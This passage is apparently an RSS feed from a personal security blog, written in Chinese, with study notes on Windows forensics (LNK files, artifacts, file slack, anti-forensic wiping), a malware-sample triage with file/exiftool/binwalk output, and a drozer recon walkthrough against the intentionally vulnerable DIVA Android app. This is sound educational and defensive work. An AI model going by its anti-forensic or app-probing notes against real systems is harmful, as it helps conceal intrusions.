&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\L&lt;/span>INE &lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">)&lt;/span>.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\P&lt;/span>owerPoint.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\S&lt;/span>ublime Text 3.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\T&lt;/span>ask Manager.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\T&lt;/span>he Interactive Disassembler &lt;span style="color:#f92672">(&lt;/span>2&lt;span style="color:#f92672">)&lt;/span>.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\T&lt;/span>he Interactive Disassembler.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\V&lt;/span>isual Studio Code.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\V&lt;/span>Mware Workstation Pro.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\A&lt;/span>ppData&lt;span style="color:#ae81ff">\R&lt;/span>oaming&lt;span style="color:#ae81ff">\M&lt;/span>icrosoft&lt;span style="color:#ae81ff">\I&lt;/span>nternet Explorer&lt;span style="color:#ae81ff">\Q&lt;/span>uick Launch&lt;span style="color:#ae81ff">\U&lt;/span>ser Pinned&lt;span style="color:#ae81ff">\T&lt;/span>askBar&lt;span style="color:#ae81ff">\W&lt;/span>ord.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\D&lt;/span>esktop&lt;span style="color:#ae81ff">\T&lt;/span>est-Dragon.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\L&lt;/span>inks&lt;span style="color:#ae81ff">\D&lt;/span>esktop.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\L&lt;/span>inks&lt;span style="color:#ae81ff">\D&lt;/span>ownloads.lnk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>c:&lt;span style="color:#ae81ff">\U&lt;/span>sers&lt;span style="color:#ae81ff">\B&lt;/span>ernie&lt;span style="color:#ae81ff">\O&lt;/span>neDrive&lt;span style="color:#ae81ff">\P&lt;/span>ersonal Vault.lnk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="lab">
 Lab
 &lt;a class="anchor" href="#lab">#&lt;/a>
&lt;/h2>
&lt;p>可以先到&lt;a href="https://code.google.com/archive/p/lnk-parser/downloads">這邊&lt;/a>下載&lt;code>lnk_parser_cmd.exe&lt;/code>&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - Windows Artifacts</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows-artifacts/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---windows-artifacts">
 TaiwanHolyHigh - Windows Forensics - Windows Artifacts
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---windows-artifacts">#&lt;/a>
&lt;/h1>
&lt;p>[TOC]&lt;/p>
&lt;p>:::info
以下引用若無特別說明皆來自於講師的上課簡報
:::&lt;/p>
&lt;h2 id="artifacts-background">
 Artifacts Background
 &lt;a class="anchor" href="#artifacts-background">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>使用者操作 Windows 作業系統時會在系統中留下或產生許多行為紀錄，稱之為 Artifacts&lt;/p>&lt;/blockquote>
&lt;ul>
&lt;li>Artifacts種類
&lt;ul>
&lt;li>特定路徑或資料夾:
&lt;ul>
&lt;li>Program Files/Program Data&lt;/li>
&lt;li>Download&lt;/li>
&lt;li>Temp$\to$這在玩分析memory中很常出現&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>電腦特定檔案:
&lt;ul>
&lt;li>LNK&lt;/li>
&lt;li>Email$\to$這在玩分析memory中也很常出現&lt;/li>
&lt;li>系統還原檔(VSS, &lt;a href="https://learn.microsoft.com/zh-tw/windows-server/storage/file-server/volume-shadow-copy-service">volume shadow copy&lt;/a>): 站在藍隊的角度可以藉此知道受害者的遭到入侵的一些證據；站在紅隊的角度可以藉此撈到一些受害者的基敏資料&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Artifacts分析面向
&lt;ul>
&lt;li>檔案Metadata: Timestamp(一般檔案的MAC time至少有兩個, Modify/Access/Create Time)可以藉此知道檔案的異動時間&lt;/li>
&lt;li>應用程式:
&lt;ul>
&lt;li>記憶體: volatility可以針對某個PID dump出執行該process的memory，也是常見的技巧&lt;/li>
&lt;li>&lt;a href="https://read01.com/zh-tw/6nOOGaj.html">Prefetch File&lt;/a>
&lt;blockquote>
&lt;p>一般位於C槽windows文件夾下（&lt;code>C:\Windows\Prefetch&lt;/code>），主要是用來存放系統已訪問的文件預讀信息；一開始創建此文件夾主要是為了加快系統的啟動過程。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>使用者的操作行為
&lt;ul>
&lt;li>Audit(AD很常碰到的event ID: 4662&amp;hellip;)&lt;/li>
&lt;li>Volatility的console可以看到駭客的command&lt;/li>
&lt;li>Volatility的malfind可以看到惡意注入的payload&amp;hellip;&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>網路行為
&lt;ul>
&lt;li>Volatility的netscan&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="most-recently-usedmru-background">
 Most Recently Used(MRU) Background
 &lt;a class="anchor" href="#most-recently-usedmru-background">#&lt;/a>
&lt;/h2>
&lt;p>就是泛指各種windows存取使用者最近access過的檔案、路徑或網路位置，是一種行為，攻防兩端都會注意的地方&lt;/p>
&lt;ul>
&lt;li>Overview
&lt;img src="https://hackmd.io/_uploads/rk1zs9mfT.png" alt="" />&lt;/li>
&lt;li>攻擊者會留下的足跡: &lt;code>.lnk&lt;/code>, &lt;code>Jump List&lt;/code>, &lt;code>User Assist Registry&lt;/code>, &lt;code>Prefetch&lt;/code>，如果攻擊者想要植入惡意程式，鑑識可以從以上四個地方看出這個intention
&lt;ul>
&lt;li>
&lt;p>&lt;code>Jump List&lt;/code>就有點像是一個shortcut，可以跳到某個地方執行或開啟something&lt;/p></description></item><item><title>TaiwanHolyHigh - Windows Forensics - Windows檔案系統與還原</title><link>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/tai.holyhigh/windows-os-forensics/taiwanholyhigh---windows-forensics---windows%E6%AA%94%E6%A1%88%E7%B3%BB%E7%B5%B1%E8%88%87%E9%82%84%E5%8E%9F/</guid><description>&lt;h1 id="taiwanholyhigh---windows-forensics---windows檔案系統與還原">
 TaiwanHolyHigh - Windows Forensics - Windows檔案系統與還原
 &lt;a class="anchor" href="#taiwanholyhigh---windows-forensics---windows%e6%aa%94%e6%a1%88%e7%b3%bb%e7%b5%b1%e8%88%87%e9%82%84%e5%8e%9f">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>What is cluster or sector?&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://www.pcdvd.com.tw/showthread.php?t=674854">基本磁碟結構&lt;/a>
磁碟儲存最小單位為sector，每一個sector包含了512bytes的資訊內容。但用sector當單位來儲存效率會很差，一般不會以一個sector當作存取檔案的單位，而是以cluster為一基本檔案單位，每一個cluster是架構在sector的2次方倍數上。假定連續的8個sector所構成一個cluster，其大小就為512×8=4096bytes(4K)，如此在存取資料時會以8個sector連續讀取而提升了相對效率。但並不是讓單位cluster越大越好，因為cluster越大相對的可能會浪費許多磁碟空間，例如設定以4K為一個cluster而要儲存的檔案內容只有1K，但這個小檔案還是佔用掉一個cluster的空間，其他3K就浪費掉了。所在考慮cluster的規劃時，需要同時考慮到檔案讀取的效能與檔案大小是否會浪費硬碟空間。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>
&lt;p>File Slack
舉例來說如果一個檔案A，大小是4個sector(2048 bytes)，現在將其刪除後又存入一個檔案B在同一位置，但其大小只有1.5個sector(768 bytes)，則後面沒有被填滿的2.5個sector事實上還殘留檔案A的一些資訊，尚未填滿的該sector(Ram Slack)+完整的兩個sector(Disk/Residual Slack)就是file slack&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/rk9GlEcG6.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;p>會有一點小複雜，反正file slack就是一個完整cluster(如果按照中FAT16來格式化128MB來說就是4個sectors)沒有被填滿的部分就對了，而ran slack或是disk(residual) slack只是在區分這些沒有被填滿的區塊而已&lt;/p>
&lt;/li>
&lt;li>
&lt;p>==比較表格==&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/S1XGzEcfp.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;p>稍微解釋一下為甚麼FAT16是單一cluster的sector數量比較多，因為按照他自己的定義，最大的cluster數量不能超過65526，也就是說如果硬碟的容量變大，單一cluster所除下來的sector數量就越多，舉例:
若一張記憶卡的大小是128MB$\to$134217728 bytes，單一cluster最少需要4個sectors
$$
134217728/512/65526\approx 4
$$
所以如果記憶卡大小是512MB$\to$，536870912 bytes，單一cluster最少需要16個sectors
$$
536870912/512/65526\approx 16
$$
當然，這樣的空間使用率是很差的，因為一個cluster就意味著一間總統套房，若所有的檔案不分大小都住進總統套房，就會造成很多浪費，或甚至是有很多file slack產生，試想如果像512MB一樣，一個cluster有16個sector，代表該總統套房可以容納$16*512=8192 bytes$，如果電腦中都是小檔案居多(1kB之類的)，那有很多空間就會浪費掉，但對於鑑識來說遺留的東西越多越能夠還原很多真相&lt;/p>
&lt;/li>
&lt;li>
&lt;p>以攻擊者或一般使用者來說，如何達到真正的毀屍滅跡?&lt;/p>
&lt;ol>
&lt;li>Encryption: 工具&lt;a href="https://sourceforge.net/projects/veracrypt/">veracrypt&lt;/a>&lt;/li>
&lt;li>File Wipe: 工具&lt;a href="https://www.fileshredder.org/">file shredder&lt;/a>&lt;/li>
&lt;li>Partition Wipe: 工具 Windows Format
&lt;ul>
&lt;li>Fast: 快速格式化&lt;/li>
&lt;li>Non-Fast: 完整格式化
&lt;a href="https://www.pcdvd.com.tw/showthread.php?t=294869">差別就是&lt;/a>
&lt;blockquote>
&lt;p>儲存檔案的時候， 除了在儲存區寫入檔案資料以外，也會在開頭一個小區塊的&amp;quot;檔案表&amp;quot;輸入相關資訊;快速格式化是只把開頭的檔案表重寫，真正儲存檔案資訊的部份則沒有更動，但是系統讀到檔案表顯示是&amp;quot;空白&amp;quot;，就會把這張片子當成是空片，就不管儲存區有沒有資料，直接覆蓋過去；換句話說，若是檔案表有標明某區存有某資料，則儲存時就會跳過這區不覆蓋
完整格式化會對格式化的區域進行讀寫測試，就是確定壞軌。快速格式化沒有&lt;/p></description></item><item><title>TeamT5筆試題目筆記</title><link>https://bernie6401.github.io/docs/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/job/interview/teamt5%E7%AD%86%E8%A9%A6%E9%A1%8C%E7%9B%AE%E7%AD%86%E8%A8%98/</guid><description>&lt;h1 id="teamt5筆試題目筆記">
 TeamT5筆試題目筆記
 &lt;a class="anchor" href="#teamt5%e7%ad%86%e8%a9%a6%e9%a1%8c%e7%9b%ae%e7%ad%86%e8%a8%98">#&lt;/a>
&lt;/h1>
&lt;p>:::info
前言: 通常我自己拿到一隻樣本，起手式會先搜一下hash，VirusTotal如果有紀錄的話最好，再來會丟到AnyRun看一下動態sandbox的狀態為何，但不確定這樣的操作是否符合本次筆試的預期，所以我會先設法在本機VM內分析看看，如果有利用這幾個online tools而得知的資訊，會再行標註
:::
:::danger
經過二階面試後，用線上的工具例如VirusTotal和AnyRun都是被嚴格禁止的。
第一個樣本總花費時間: 2天/第二個樣本總花費時間: 4天
:::&lt;/p>
&lt;h1 id="樣本93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a">
 樣本(93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a)
 &lt;a class="anchor" href="#%e6%a8%a3%e6%9c%ac93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a">#&lt;/a>
&lt;/h1>
&lt;h2 id="惡意程式">
 惡意程式
 &lt;a class="anchor" href="#%e6%83%a1%e6%84%8f%e7%a8%8b%e5%bc%8f">#&lt;/a>
&lt;/h2>
&lt;h3 id="檔案資訊">
 檔案資訊
 &lt;a class="anchor" href="#%e6%aa%94%e6%a1%88%e8%b3%87%e8%a8%8a">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>
&lt;p>DIE(Detect It Easy)
&lt;img src="https://hackmd.io/_uploads/S1Lbp6T3p.png" alt="圖片" />
看起來是一個HTML的純文字檔案&lt;/p>
&lt;/li>
&lt;li>
&lt;p>File/Stat/Exiftool
從以下結果來看，是一個SMTP的郵件檔案，並且是純文字的形式，所以直覺上可能和Outlook或是Firefox Thunderbird有關係，以binwalk的結果來說，他應該有壓縮一些內容在其中，如果實際丟到Any.Run的話會發現的確有很多檔案被compressed
&lt;img src="https://hackmd.io/_uploads/rJfrgyR3a.png" alt="圖片" />&lt;/p>
&lt;p>或者是說，從檔案內容來看(HxD)，會發現data帶了一個base64的file，decode會發現是&lt;code>0x50 4B 03 04&lt;/code>
:::spoiler Command Result&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ file 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a: SMTP mail, ASCII text, with CRLF line terminators
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ exiftool 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ExifTool Version Number : 12.40
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Name : 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Directory : .
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Size : &lt;span style="color:#ae81ff">180&lt;/span> KiB
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Modification Date/Time : 2023:08:14 11:54:39+08:00
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Access Date/Time : 2024:02:29 16:55:48+08:00
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Inode Change Date/Time : 2024:02:29 16:55:48+08:00
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Permissions : -rwxrwxrwx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Type : TXT
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>File Type Extension : txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MIME Type : text/plain
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MIME Encoding : us-ascii
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Newlines : Windows CRLF
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Line Count : &lt;span style="color:#ae81ff">2410&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Word Count : &lt;span style="color:#ae81ff">2741&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ stat 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> File: 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Size: &lt;span style="color:#ae81ff">184712&lt;/span> Blocks: &lt;span style="color:#ae81ff">368&lt;/span> IO Block: &lt;span style="color:#ae81ff">4096&lt;/span> regular file
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Device: 66h/102d Inode: &lt;span style="color:#ae81ff">1688849860790082&lt;/span> Links: &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Access: &lt;span style="color:#f92672">(&lt;/span>0777/-rwxrwxrwx&lt;span style="color:#f92672">)&lt;/span> Uid: &lt;span style="color:#f92672">(&lt;/span> 1000/ sbk6401&lt;span style="color:#f92672">)&lt;/span> Gid: &lt;span style="color:#f92672">(&lt;/span> 1000/ sbk6401&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Access: 2024-02-29 16:55:48.949690200 +0800
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Modify: 2023-08-14 11:54:39.000000000 +0800
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Change: 2024-02-29 16:55:48.949690200 +0800
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Birth: -
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ binwalk 93f33e4e9a732de665510aa5fdc565fc00bcf5e28101c5cc55b5b16f94288b8a
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>DECIMAL HEXADECIMAL DESCRIPTION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--------------------------------------------------------------------------------
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">4244&lt;/span> 0x1094 HTML document header
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">5554&lt;/span> 0x15B2 HTML document footer
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">73264&lt;/span> 0x11E30 StuffIt Deluxe Segment &lt;span style="color:#f92672">(&lt;/span>data&lt;span style="color:#f92672">)&lt;/span>: fWm1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">169908&lt;/span> 0x297B4 IMG0 &lt;span style="color:#f92672">(&lt;/span>VxWorks&lt;span style="color:#f92672">)&lt;/span> header, size: &lt;span style="color:#ae81ff">218780743&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Test DIVA - activity exported</title><link>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/</guid><description>&lt;ul>
&lt;li>DIVA - &lt;a href="https://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz">Download&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="test-diva---activity-exported">
 Test DIVA - activity exported
 &lt;a class="anchor" href="#test-diva---activity-exported">#&lt;/a>
&lt;/h1>
&lt;p>參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>&lt;sup id="fnref:4">&lt;a href="#fn:4" class="footnote-ref" role="doc-noteref">4&lt;/a>&lt;/sup>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>起手式 - 確認App資訊&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.list -f diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>jakhar.aseem.diva &lt;span style="color:#f92672">(&lt;/span>Diva&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.info -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Application Label: Diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Process Name: jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Version: 1.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Data Directory: /data/user/0/jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> APK Path: /data/app/~~ieYmYeSxvDRbS7R8da3n_g&lt;span style="color:#f92672">==&lt;/span>/jakhar.aseem.diva--xnWMS5i2UVEuuoE1JHskg&lt;span style="color:#f92672">==&lt;/span>/base.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10282&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> GID: &lt;span style="color:#f92672">[&lt;/span>3003&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Shared Libraries: &lt;span style="color:#f92672">[&lt;/span>/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Shared User ID: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uses Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.WRITE_EXTERNAL_STORAGE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_EXTERNAL_STORAGE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.INTERNET
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.POST_NOTIFICATIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.ACCESS_MEDIA_LOCATION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_MEDIA_AUDIO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_MEDIA_VIDEO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_MEDIA_IMAGES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Defines Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.attacksurface jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attack Surface:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">3&lt;/span> activities exported
